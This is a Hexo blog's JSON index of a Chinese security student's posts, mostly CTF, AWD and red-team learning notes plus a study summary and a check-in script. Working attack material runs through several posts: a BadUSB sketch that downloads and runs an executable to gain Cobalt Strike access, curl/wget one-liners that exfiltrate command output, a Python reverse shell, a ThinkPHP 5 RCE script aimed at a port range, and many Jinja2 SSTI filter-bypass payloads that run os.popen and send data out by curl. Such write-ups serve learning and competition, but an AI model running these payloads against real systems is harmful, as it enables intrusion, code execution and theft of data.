{"meta":{"title":"Polo's Blog","subtitle":null,"description":null,"author":"Polo","url":"https://polosec.github.io","root":"/"},"pages":[{"title":"关于我","date":"2020-03-06T03:42:37.000Z","updated":"2021-01-26T10:01:42.200Z","comments":true,"path":"about/index.html","permalink":"https://polosec.github.io/about/index.html","excerpt":"","text":"ab4o/polo研究兴趣：红蓝对抗/内网渗透/ctf-web/流量分析/取证专业：网络空间安全"},{"title":"archives","date":"2020-03-06T03:42:54.000Z","updated":"2020-03-06T11:44:30.532Z","comments":true,"path":"archives/index.html","permalink":"https://polosec.github.io/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-03-06T03:42:46.000Z","updated":"2020-03-06T11:43:55.552Z","comments":true,"path":"categories/index.html","permalink":"https://polosec.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-03-06T03:40:43.000Z","updated":"2020-03-06T11:43:14.432Z","comments":true,"path":"tags/index.html","permalink":"https://polosec.github.io/tags/index.html","excerpt":"","text":""},{"title":"Search","date":"2021-04-23T15:53:40.000Z","updated":"2021-04-23T15:55:37.878Z","comments":true,"path":"search/index.html","permalink":"https://polosec.github.io/search/index.html","excerpt":"","text":""}],"posts":[{"title":"实习&季度总结","slug":"实习-季度总结","date":"2021-04-23T07:17:00.000Z","updated":"2021-04-23T15:55:50.099Z","comments":true,"path":"2021/04/23/实习-季度总结/","link":"","permalink":"https://polosec.github.io/2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/","excerpt":"","text":"123dddd32","categories":[],"tags":[],"author":"Polo"},{"title":"命令执行结果外带","slug":"命令执行结果外带","date":"2021-04-17T18:25:55.000Z","updated":"2021-04-17T21:37:56.341Z","comments":true,"path":"2021/04/18/命令执行结果外带/","link":"","permalink":"https://polosec.github.io/2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/","excerpt":"","text":"wget –header=”test:$(whoami)” http://ssti.com:5000\\?username\\=1 whoami | curl -F “:data=@-“ http://ssti.com:5000\\?username\\=1 Curl “http://ssti.com:5000?username=&#96;whoami&#96;&quot;","categories":[],"tags":[]},{"title":"badusb踩坑&近期感想","slug":"badusb踩坑-近期感想","date":"2021-03-29T12:34:48.000Z","updated":"2021-04-20T19:41:48.607Z","comments":true,"path":"2021/03/29/badusb踩坑-近期感想/","link":"","permalink":"https://polosec.github.io/2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/","excerpt":"","text":"前言： 近期在公司内部学了一点红队技能，虽然目前用不上，但是做个记录，顺便发牢骚。 致谢&amp;参考https://www.freebuf.com/articles/system/261020.html https://blog.csdn.net/sxhexin/article/details/87914649 https://www.anquanke.com/post/id/227477 https://www.freebuf.com/articles/system/261020.html Badusb 插入上线cobalt strike准备工作ATtiny85 开发板、arduino IDE下载https://www.arduino.cc/en/Main/Softwaredigispark。暂时先不要装驱动！！驱动有大坑。 看freeebuf里面的教程装完驱动，烧录完只能执行一次，需要更新下固件才可以重复使用，后面会提到。 环境配置打开IDE,在文件-&gt;首选项中加入附加开发板管理，附加开发板管理网址处写 1http:&#x2F;&#x2F;digistump.com&#x2F;package_digistump_index.json 注意，这里需要翻墙，后面添加开发板下载相关配置时也需要翻墙，现在就翻着 别断了。 添加开发板IDE中-工具-开发板管理，类型-contributed/贡献，选择 然后选安装（翻墙） 安装好后，选择这个16.5mhz的开发板。 更新 boot loader更新 BootLoader的教程看 https://blog.csdn.net/sxhexin/article/details/87914649，这里不再赘述，跟着这个教程走没问题的，如果你之前有装相关驱动，请把驱动卸载干净！！！ 更新BootLoader是因为避免踩烧录完只能运行一次的坑！！ BootLoader是大坑，一定要好好弄！ 编写代码有兴趣一步步走的可以写个测试代码 cmd弹个窗什么的，我这里一步到位，直接远程加载exe。 对于cs 可以生成powershell，然后cmd里面powershell加载调用直接上线。 使用CMD远程下载可执行文件我选择用cmd的原因是因为 我还不会powershell免杀（2333） 所以 探索了下 如何类似Linux执行多条命令，发现在Windows cmd下是and符号&amp;。 执行命令的代码框架如下： 123456789101112#include &quot;DigiKeyboard.h&quot;//库文件void setup() &#123;// setup函数只运行一次DigiKeyboard.delay(2000);//等待两秒，给电脑自动加载配置时间DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//摁住WIN键DigiKeyboard.delay(300);//等待300毫秒DigiKeyboard.println(&quot;cmd&quot;);//输入CMDDigiKeyboard.delay(300);DigiKeyboard.println(&quot;curl http://12xxxx0/calc.exe &gt; E:\\\\calc.exe &amp; E:\\\\calc.exe&quot;);//执行PAYLOAD，双引号需要斜杠转义&#125;void loop() &#123;&#125; 注意，在最后一个注释处，是在前面语句打开cmd黑框的情况下，在cmd中输入的语句。两个反斜杠是为了转义。 我的思路是，将可执行exe文件上传至服务器，通过curl的方式下载并重定向至某个驱动器并执行。 我本来想放到C盘，但是放到C盘，有可能存在权限问题（放在C:\\Windows\\Temp）目录下也有些问题，于是放到了D/E盘。 将上述代码在IDE中输入后ctrl+u上传，然后插入attiny85 一定是先拔出来，出现这个 60seconds的时候插进去，出现下面这一串代表写入成功 并且会自动执行一次。 然后拔出来 再插进去的时候 就有弹计算器的效果了。（小思考，如何在执行完exe后自动关闭cmd黑框？） 效果如下： CMD上线CS嫖来了大佬的免杀方法2333 试一下exe上线cs 小思考的答案是：命令后跟&amp; exit; 23333 杂谈5pyA6L+R5LiN5pivaHfkuYjvvIzorqTor4bkuIDkuKrlhazlj7jnmoRocuWnkOWnkO+8jOacgOi/keS5n+WcqGh35oub5Lq677yM6ZyA6KaB5LiA5Lqb5pyJ5omL5bCx6KGM55qE5bKX5L2N77yM5a+55rKh5Y67aHfov4cg5bm25LiU5oqA5pyv5LiN5oCO5LmI5qC355qE5ZCM5a2m5p2l6K+077yMNDAw5LiA5aSp55qE5b6F6YGH44CB5YyF5ZCD5L2P44CB5LiN6ZyA6KaB6Ieq5bex5Z6r6ZKx44CB6aG555uu546w5Zy65pyJ5Lq65bim77yM5oiR6KeJ5b6X5bey57uP5b6I5aW95ZWm44CC5aaC5p6c5oiR5aSn5LqM55qE5pe25YCZ5pyJ6L+Z56eN5py65Lya77yM5ZOq5oCV5LiN57uZ5oiR5bel6LWE77yM5oiR5Lmf6KaB5Y6744CC5oiR5L2c5Li65LiA5Liq5a2m55Sf77yM6Zmk5LqG5aSW5Ye66Ieq5bex5o6l6aG555uu77yM5a6e5Zyo5piv5oOz5LiN5Yiw6L+Y5pyJ5LuA5LmI5q+UaHfmm7Tlpb3nmoTog73nm7jlr7nku47nroDljZXlvIDlp4vmjqXop6blronlhajlrp7miJjnmoTlnLrmma/kuobjgILvvIhTUkPkuI3nrpfvvIxTUkPkuZ/pnIDopoHnm7jlvZPnmoTlronlhajln7rnoYDjgILvvInmiJHmiorov5nkuKrmtLvmjqjov4fljrvkuYvlkI7vvIzkuInkuKrluIjlvJ/kuZ/lvojnu5nlipvvvIzpgJrov4fkuobpnaLor5XjgILlj6/kuIfkuIfmsqHmg7PliLDor7flgYfnmoTml7blgJnlh7rpl67popjkuobvvIzlr7zlkZjor7TnjrDlnKjnmoTph43lv4PlupTor6XmmK/kuJPkuJror77lrabkuaDjgIHogIzkuI3mmK/mg7PnnYDlh7rljrvlrp7kuaDvvIzlubbkuJTmi7/miJHkuL7kvovlrZAyMzMz44CC5pyA5ZCO6L+Y6K+077yM5Y+q6KaB5L2g5Y675LqG5bCx57uZ5L2g6YCA5a2m77yM55yf5LiN5oiz44CC54S26ICM5pu05Y+v56yR55qE5piv77yM5p+Q6ICB5biI5ZyoMTfnuqfpgJrnn6XnvqTlj5Hkuoblj6bkuIDlrrbmnLrmnoTnmoRod+Wuo+S8oO+8jOW+hemBh+aIkeS5n+ivtOS4i++8jDMwMC00MDDkuIDlpKnvvIzkuI3ljIXlkIPkvY/vvIzmnInlhY3otLnln7norq3vvIzmoLnmja7ln7norq3ogIPmoLjnu5PmnpzliIbnuqLok53pmJ/vvIjvvJ/vvInvvIznhLblkI7miJHmiZPnlLXor53ov4fljrvpl67kuobkuIvvvIzmu6HlmLTot5/miJHosIjnkIbmg7PosIjpgZPlvrfosIjmioDmnK/jgIHlsLHor7TlrabnlJ/kuI3opoHogIHmg7PnnYDmjKPpkrHkupHkupHjgILmiJHkvLDorqEg5LiN57uZ5oiR6L+Z5LiJ5Liq5biI5byf5YGH55qE5Y6f5Zug77yM5bqU6K+l5piv5Yqo5LqG5LuW5Lus55qE6JuL57OV5LqG5ZCn77yM5LuO6YKj6L656LWw6IO95oq96ZKxMjMzM+OAguWtpumZouWvueaIkeW+iOWlveOAgeWQhOS9jemihuWvvOiAgeW4iOWSjOiUvOWPr+S6su+8jOWtpumZouS5n+e7meS6huaIkeaOqOWFjeWQjemine+8jOmhuuWIqeaOqOWFjeiHs1VFU1RD44CC5b+D5oCA5oSf5oGp5LmL5b+D77yM5oOz5o6o5biI5byf5LiA5oqK77yM5Y67aHfvvIzmsqHmg7PliLDnq5/nhLbkuI3nu5nlh4blgYfvvIznnJ/nmoTvvIzlv4Pph4zpnaLlh4nkuoblvojlpJrjgILkuI3or7TkuoZ+57un57ut5YaZ5q+V5Lia6K665paH5LqGfg==","categories":[],"tags":[]},{"title":"近一年学习总结","slug":"近一年学习总结","date":"2021-03-06T08:56:06.000Z","updated":"2021-03-06T09:10:50.739Z","comments":true,"path":"2021/03/06/近一年学习总结/","link":"","permalink":"https://polosec.github.io/2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"","text":"虽然接触安全从初中就算开始了，但当时也仅仅是停留于混混娱乐圈，日一日别人的webshell。 大一大二对安全知识的学习较少，大二外出打了两次比赛，成绩较差，直接白给。 大三寒假疫情在家的时候算是正式开始学习安全知识，做最简单的靶场，刷题，前两次正经打的比赛是I春秋高校抗疫和BJDCTF。 这是一个纠结的过程，因为在那个阶段我还要准备保研，还在保研和考研两者之间摇摆。 最终下定决心冲一冲，那是三月底。某公众号预测我保研成功率在30%左右。 具体学什么知识在这里也不想说了，算是从最基础的开始学习吧，印象比较深的是LFI。现在我XSS和注入玩的也不好，算是只会用工具跑跑。 保完研之后有些许松懈，对安全知识的学习有些懈怠了，SRC还没开始搞，到现在上班时间也不太充裕。 现在正好是三月初，距离我开始正式接触安全也差不多一年的时间，在这一年里，我做到了： 1.两份渗透岗实习经历 2.两次通过护网面试，一次中级，一次初级。（蓝队 3.拿到五所985网络安全专业OFFER,其中四个学硕; 4.数次参加线上赛，虽然白给的较多 5.两次带队参加省赛 6.开始打AWD 7.独立发表一篇论文 8.独立完成两个小项目 9.美赛建模一等奖 10.自费MacBook Pro 11.经济独立 12.顺利保研 下一年渴望更健康的身体与相对坚强的意志，至少不能中午一觉睡三个小时。 仅此记录","categories":[],"tags":[]},{"title":"记一次线上AWD","slug":"记一次线上AWD","date":"2021-02-24T16:24:25.000Z","updated":"2021-02-24T16:52:22.848Z","comments":true,"path":"2021/02/25/记一次线上AWD/","link":"","permalink":"https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/","excerpt":"","text":"最近打了一次线上AWD，算是第一次正式打AWD,表现不太好，前期看了一些AWD的思路和套路，但是没有真正应用于实际的AWD环境中，随做一次记录，记录这里面存在的问题以及没做好的地方。 开赛开局给了ssh和web服务以及要求，如果被check down了，每轮扣100分（当时不知道每轮扣100分，以为一共扣100，每次restart需要扣100并且重置环境，所以就一直没restart） 防护拿到ssh权限后首先备份了文件，用D盾、河马webshell专杀工具对web环境进行杀毒，想查杀webshell。 在webshell查杀环节中，使用河马webshell专杀工具和D盾杀了一个shell，但是有免杀shell没杀出来（一般AWD会内置多个后门），由于时间原因也没有细看，造成的后果是被传了不死马。（这是后话了。 在webshell查杀环节中应改进的地方是： 1.采用多种工具综合查杀webshell 2.对疑似后门文件手工查看，不能完全相信工具。 弱点1流量监控脚本没挂上去，导致监控流量失败，无法得知有哪些payload是发起了攻击。 自检通过观察web服务以及报错页面，出现了经典的十年磨一剑—-TP5.0.2，于是立刻想到了TP5.0.2的RCE。 网上收集payload后打了一波cat/flag，成功，并且通过该方式拿到了其他队伍的flag，遂考虑采用脚本编写EXP批量getflag并通知负责防护的队员修复相关漏洞。 弱点2在修复时浪费了太多的时间，负责修复的队员无法尽快修复，并在上传修复后的文件时遇到了权限问题。 弱点3临场紧张+payload不熟悉 我真的吐了。当时太紧张了，之前利用TP5的payload也是复制粘贴，这两个因素加起来导致我在Hackbar能顺利打payload，Burp也可以，但到了写脚本的时候就不行。因为payload是四个键值对，我写脚本的时候只写了一个。 贴一下我当时写的脚本 123456789#!/usr/bin/env pythonimport requests,jsonurl=&quot;http://47.104.144.188:&quot;rest=&quot;/index.php?s=captcha&quot;data=&#123;&#x27; _method&#x27;:&#x27;__construct&amp;filter%5B%5D=system&amp;get%5B%5D=cat+%2Fflag&amp;method=get&#x27;&#125;for port in range(9001,9051): urls=str(url+str(port)+rest) response=requests.post(url=urls,data=data) print (response.text) 攻击在拿到一个并且唯一一个payload后，由于没有编写出批量利用脚本，遂考虑手动打，导致的得分缓慢。 弱点4临场脚本编写能力欠缺 在编写脚本的过程中，需要用到对html标签解析的库（叫啥忘了）、多线程（批量getflag和提交flag），但由于很久没写多线程了，所以忘了多线程咋用了。。而且解析html标签还是大二学爬虫的时候写的，太过久远，也搞忘记了。所以最后脚本也没跑起来，耽误了太多时间。 弱点5对AWD赛制不熟悉，机器至少down了三分之一的比赛时间，5分钟一轮，一轮掉100分。我说怎么越交flag分越少。。绝了。 反思与改进提升脚本编写能力不说了。多写多看多寻思 多借鉴别人的思路，掌握基本库的用法。 先把多线程和xpath解析学会了！！！ 提升payload熟练度要求平时复现过程中不能拿到直接打，要分析原理与利用链。 提升运维水平赛前看到了安恒低权限EDR，但是部署起来看起来麻烦，就没搞，但是流量监控脚本也没挂上去，以后需要提前部署并实践相关脚本与环境。 控制好相关文件的读写权限等。 提升应急反应能力要通过流量脚本观察是否有入侵与挂马行为，学会如何处理不死马等紧急情况。 提升反制能力要能通过别人打的payload反打别人 完善武器库多收集webshell查杀工具、积累webshell免杀方式、收集常见漏洞EXP。","categories":[],"tags":[{"name":"awd","slug":"awd","permalink":"https://polosec.github.io/tags/awd/"}]},{"title":"智慧曲园自动签到+微信推送","slug":"server酱实现签到提醒","date":"2021-01-19T14:11:27.000Z","updated":"2021-01-19T12:21:05.822Z","comments":true,"path":"2021/01/19/server酱实现签到提醒/","link":"","permalink":"https://polosec.github.io/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/","excerpt":"","text":"智慧曲园自动签到https://github.com/polosec/qfnuAutoTemperatureSubmit 使用方法： 首先安装环境依赖 pip3 install requests 将该脚本上传至服务器 （我的路径是/root） 新建脚本 auto.sh 1python3 /root/demo1.py xxxxx xxxxxxx &gt;1.txt ; python3 /root/serverjiang.py 新建定时任务 crontab -e 1 0 * * * /root/auto.sh 每天凌晨0点1分自动执行 /root/auto.sh 这条命令 绑定server酱在server酱绑定微信后，拿到key，放到下面脚本 yourkey 这个地方。 serverjiang.py: 1234567891011#!/usr/bin/env pythonimport requests,jsonurl=&quot;http://sc.ftqq.com/yourkey.send?text=&quot;data=open(&#x27;1.txt&#x27;).readline()data=json.loads(data)data=data[&#x27;message&#x27;]text=str(data)desp=&quot;success&quot;url=url+text+&quot;&amp;desp=&quot;+despr=requests.get(url=url).text 运行结果每天0点1分自动提交体温上报请求，并且将返回的信息（成功/错误）","categories":[],"tags":[]},{"title":"XCTF/*CTF web4","slug":"XCTF-CTF-web4","date":"2021-01-18T11:51:30.000Z","updated":"2021-01-18T12:26:01.085Z","comments":true,"path":"2021/01/18/XCTF-CTF-web4/","link":"","permalink":"https://polosec.github.io/2021/01/18/XCTF-CTF-web4/","excerpt":"","text":"上周末刚结束了*ctf的比赛，又摸鱼了。。赛后看雪宝的wp复现出来的，发现是socket写的有点问题 搞到夜里三点也没搞出来 wtcl oh my socket题目分析： 直接给了一堆docker 先跑起来看看是什么 docker-compose up -d 跑起来了三个容器 分别是 server client webserver 先整理下网络环境情况： webserver 172.21.0.4 server 172.21.0.2 client 172.21.0.3 首先访问webserver 123456789101112131415161718192021222324252627282930313233from flask import Flask, render_template, requestfrom subprocess import STDOUT, check_outputimport osapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index(): return open(__file__).read()@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def upload_file(): if request.method == &#x27;GET&#x27;: return render_template(&#x27;index.html&#x27;) elif request.method == &#x27;POST&#x27;: f = request.files[&#x27;file&#x27;] f.save(os.path.join(f.filename)) try: output = check_output([&#x27;python3&#x27;, f.filename], stderr=STDOUT, timeout=80) content = output.decode() except Exception as e: content = e.__str__() os.system(&#x27; &#x27;.join([&#x27;rm&#x27;, f.filename])) return contentif __name__ == &#x27;__main__&#x27;: app.run(port=5000, host=&#x27;0.0.0.0&#x27;) 通过对源码进行审计 发现上传文件后会执行文件里面的内容，于是尝试反弹shell，上传如下脚本： 这里请注意理解该段代码的作用，和bash -i那个的原理相似，都是将std out std in std err重定向至socket。 详细的分析链接放在了最后面 12345678import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&quot;ip&quot;,6666))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2) p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]) 本地监听搞起来，然后上传，得到反弹过来的shell 下面审计server.py 123456789101112131415161718192021222324252627282930313233343536373839404142from socket import *from time import ctimeimport timeHOST = &#x27;172.21.0.2&#x27;PORT = 21587BUFSIZ = 1024ADDR = (HOST, PORT)tcpSerSock = socket(AF_INET, SOCK_STREAM)tcpSerSock.bind(ADDR)tcpSerSock.listen(5)cnt = 0while True: print(&#x27;waiting for connection...&#x27;) tcpCliSock, addr = tcpSerSock.accept() cnt += 1 print(&#x27;...connnecting from:&#x27;, addr) try: while True: data = tcpCliSock.recv(BUFSIZ) if not data: break if data == b&#x27;*ctf&#x27;: content = open(&#x27;oh-some-funny-code&#x27;).read() tcpCliSock.send((content.encode())) else: tcpCliSock.send((&#x27;[%s] %s&#x27; % (ctime(), data)).encode()) except Exception as e: pass if cnt &gt;= 2: time.sleep(120) tcpSerSock.close() exit(0)tcpSerSock.close() 得到flag的条件是发送的数据为b’*ctf’ 发现这个socket写的有些问题，连接大于2时就断开了，所以需要尝试自己写个socket连进去，防止别人在连，要一直循环。 于是得到如下client的脚本： 123456789101112131415161718from socket import *HOST=&#x27;172.25.0.2&#x27;PORT=21587BUFSIZ=1024ADDR=(HOST,PORT)tcpCliSock = socket(AF_INET, SOCK_STREAM)tcpCliSock.connect(ADDR)while True: data=b&#x27;*ctf&#x27; if not data: break tcpCliSock.send(data) data = tcpCliSock.recv(BUFSIZ) if not data: break print(data)tcpCliSock.close() 但是有个问题，题目的服务器每两分钟重启一次，拿到shell后再装vim什么的太慢了，于是将脚本base64编码， echo base64_encoded_script | base64 -d &gt;1.py 以这种方式将脚本内容上传至webserver，python3 1.py执行即可。 我认为client.py 和client的容器是起迷惑作用 或者说是模拟别人在向server发送请求，所以在本地模拟时把client容器down掉就可以了。 为了验证这里一理论，我在题目的在线环境中通过webserver打到client服务器进行了LFI，发现并没有client.py，我认为上述说法成立。 总结当前还有个问题就是不知道是哪句话实现了删除文件前执行了文件里的内容。 参考链接： 雪宝wp https://blog.csdn.net/weixin_30526593/article/details/98650248","categories":[],"tags":[]},{"title":"近期ssti题目总结","slug":"近期ssti","date":"2020-12-22T07:35:19.000Z","updated":"2021-01-06T13:34:04.259Z","comments":true,"path":"2020/12/22/近期ssti/","link":"","permalink":"https://polosec.github.io/2020/12/22/%E8%BF%91%E6%9C%9Fssti/","excerpt":"","text":"分析下近期做过的ssti题目的思路 你的名字 题目分析打开题目 发现输入名字 尝试输入4 报了一个php的错误 继续尝试 1&#123;% print 2*5 %&#125; 成功. 下面将尝试利用ssti进行文件读取/命令执行 尝试 1&#123;%print config%&#125; 失败，返回值为空 尝试多个关键字后，发现是对黑名单关键词采取了置空的方法进行过滤，那么可以考虑在关键字中加入另一个关键字的方式，如 iconfigf 代表if。 首先获得所有子类 payload： 1&#123;% print &#x27;&#x27;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()%&#125; 拿到所有子类后，查找init global存在os模块的类，常见的是catch_warnings类 我这里用的是笨方法，将所有的子类打印出来后放到sublime里面找到的catch_warings类的下标为59 下面将进一步利用该类实现命令执行。 1234567&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche%&#125;&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d &#96;ls &#x2F; |base64&#96; &#39;)%&#125;通过curl外带命令执行的结果,获得了外带的根目录ls的结果，发现了flag的存放位置，直接getflag。&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d &#96;tail &#x2F;flag_1s_Hera|base64&#96;&#39;)%&#125; 题外话介绍popen的用法 popen方法在os模块下，使用前需要import os popen是从一个命令打开一个管道，返回值意味着执行结果，正常执行的话返回值为0 popen在ssti中常作为替代system进行命令执行的一种方式，现演示popen用法 在此例中可以看到，调用os.popen.read()方法会返回执行系统命令的结果，而不是执行成功的返回值0 popen方法中subprocess模块下也有。 安洵杯 normal_ssti首先看过滤了哪些关键字 使用burp fuzz关键字，发现过滤了很多的关键字 1首先看过滤了&#123;&#123;,可以使用&#123;%print%&#125; 的方式执行表达式 过滤了空格，可以用小括号的方式绕过 1&#123;%print(1)%&#125; 这里还过滤了. 可以用a t t r()绕过 其他的关键字可以考虑使用unicode编码绕过 lipsum方法globlas-builtins中存在os模块，可以直接执行命令。 首先构造未编码payload： 1&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)())%&#125; 然后构造编码payload： 1234567http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&quot;\\u006f\\u0073&quot;)|attr(&quot;\\u0070\\u006f\\u0070\\u0065\\u006e&quot;)(&quot;\\u0077\\u0068\\u006f\\u0061\\u006d\\u0069&quot;)|attr(&quot;\\u0072\\u0065\\u0061\\u0064&quot;)())%&#125;接下来尝试读取flag：&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat&lt;&gt;&#x2F;flag&quot;)|attr(&quot;read&quot;)())%&#125;http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&quot;\\u006f\\u0073&quot;)|attr(&quot;\\u0070\\u006f\\u0070\\u0065\\u006e&quot;)(&quot;\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067&quot;)|attr(&quot;\\u0072\\u0065\\u0061\\u0064&quot;)())%&#125; 另一种思路看了师傅们的解法，我在尝试另一种编码绕过的方式解决这个问题 12345payload1:http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(1|attr(%22\\137\\137class\\137\\137%22)|attr(%22\\137\\137mro\\137\\137%22)|attr(%22\\137\\137\\147etitem\\137\\137%22)(1)|attr(%22\\137\\137subclasses\\137\\137%22)()|attr(%22\\137\\137\\147etitem\\137\\137%22)(186)|attr(%22\\137\\137init\\137\\137%22)|attr(%22\\137\\137\\147lobals\\137\\137%22)|attr(&quot;\\137\\137\\147etitem\\137\\137&quot;)(&quot;sys&quot;)|attr(&quot;modules&quot;)|attr(&quot;\\137\\137\\147etitem\\137\\137&quot;)(&quot;os&quot;)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;payload2:http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(a|attr(%22\\137\\137init\\137\\137%22)|attr(%22\\137\\137\\147lobals\\137\\137%22)|attr(%22\\137\\137\\147etitem\\137\\137%22)(%22sys%22)|attr(%22modules%22)|attr(%22\\137\\137\\147etitem\\137\\137%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125; 上述两种方法是通过找sys模块中的os进行命令执行。（膜一下师傅：） nctf 2020 ssti1blacklist = [&#x27;%&#x27;,&#x27;-&#x27;,&#x27;:&#x27;,&#x27;+&#x27;,&#x27;class&#x27;,&#x27;base&#x27;,&#x27;mro&#x27;,&#x27;_&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;init&#x27;,&#x27;global&#x27;,&#x27;.&#x27;,&#x27;\\&#x27;&#x27;,&#x27;req&#x27;,&#x27;|&#x27;,&#x27;attr&#x27;,&#x27;get&#x27;] 懒了，改一下上题的blacklist继续跑（doge 先用bp fuzz一下，发现过滤了很多关键字。 根据上题思路，尝试unicode绕过对关键字的过滤，如 class -&gt; \\u0063\\u006c\\u0061\\u0073\\u0073 这种方法可以成功bypass。 官方wp的方法是用十六进制绕过，也是可以的，下面是用16进制绕过的pld： 1http://10.90.89.27:5050/test?url=&#123;&#123;%22%22[%22\\x5f\\x5fcla%22+%22ss\\x5f\\x5f%22][%22\\x5f\\x5fmr%22+%22o\\x5f\\x5f%22][1][%22\\x5f\\x5fsubcla%22+%22sses\\x5f\\x5f%22]()[186][%22\\x5f\\x5fin%22+%22it\\x5f\\x5f%22][%22\\x5f\\x5fgloba%22+%22ls\\x5f\\x5f%22][%22sys%22][%22modules%22][%22os%22][%22popen%22](%22cat%3C%3E/flag%22)[%22read%22]()&#125;&#125; unctf2020 sstiblacklist: 1[ ] &#x27; &quot; _ 绕过方法： 123[] : __getitem__&#x27;和&quot;: request.args.xxx_: |attr() 1Payload:http://192.168.0.116:5000/?url=&#123;&#123;()|attr(request.args.class)|attr(request.args.mro)|attr(request.args.getitem)(1)|attr(request.args.subclass)()|attr(request.args.getitem)(186)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.sys)|attr(request.args.mod)|attr(request.args.getitem)(request.args.os)|attr(request.args.popen)(request.args.whoami)|attr(request.args.read)()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__&amp;&amp;subclass=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;sys=sys&amp;mod=modules&amp;os=os&amp;popen=popen&amp;whoami=whoami&amp;read=read nctf 2020 你就是我的master吗blacklist： 1&#x27; . _ class base subclasses request 绕过方法: 1234&#x27; : &quot;&quot;. :[&quot;xxx&quot;] _:八进制 十六进制 Unicode 绕过 八进制如\\137关键字： 字符串拼接 如 &quot;cla&quot;+&quot;ss&quot; Payload: 12http://192.168.1.103:5000/?url=&#123;&#123;0[&quot;\\137\\137cla&quot;+&quot;ss\\137\\137&quot;][&quot;\\137\\137mro\\137\\137&quot;][1][&quot;\\137\\137subclas&quot;+&quot;ses\\137\\137&quot;]()[186][&quot;\\137\\137init\\137\\137&quot;][&quot;\\137\\137globals\\137\\137&quot;][&quot;sys&quot;][&quot;modules&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]()&#125;&#125; 总结flask/jinja2渲染殷勤的ssti问题考察更多的是对builtins函数/模块的使用以及了解程度，各种绕过过滤技巧 换而言之是对python语言基础语法的理解程度和面向对象思想的熟练程度。","categories":[],"tags":[]},{"title":"VULSTACK 红队评估(二) ","slug":"VULSTACK-红队评估-二","date":"2020-12-16T09:28:02.000Z","updated":"2020-12-16T09:30:37.940Z","comments":true,"path":"2020/12/16/VULSTACK-红队评估-二/","link":"","permalink":"https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/","excerpt":"","text":"Vulstack红队评估（二）环境配置踩坑webserver一开始用默认密码上不去，这里的解决方案是登录administrator账户，然后修改密码。 部署网络新建一个VMNET，编号为1，模式为hostonly，模拟内网环境，网段为10.10.10.0/24 NAT网段为192.168.111.0/24 DC(内网) 网卡选择VMNET1，IPV4地址为 10.10.10.10 WIN7(内网) 网卡选择VMNET1，IPV4地址为 10.10.10.20 WEBSERVER（内外网） 网卡1选择VMNET1，IPV4地址为10.10.10.80，网卡2选择NAT，DHCP auto configuration，本次地址为192.168.111.128 服务在C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\bin目录下存在三个批处理文件setDomainEnv，startManagedWebLogic，stopManagedWebLogic。点击配置weblogic环境。 启动服务后，访问web服务器ip:7001/console即可自动部署。 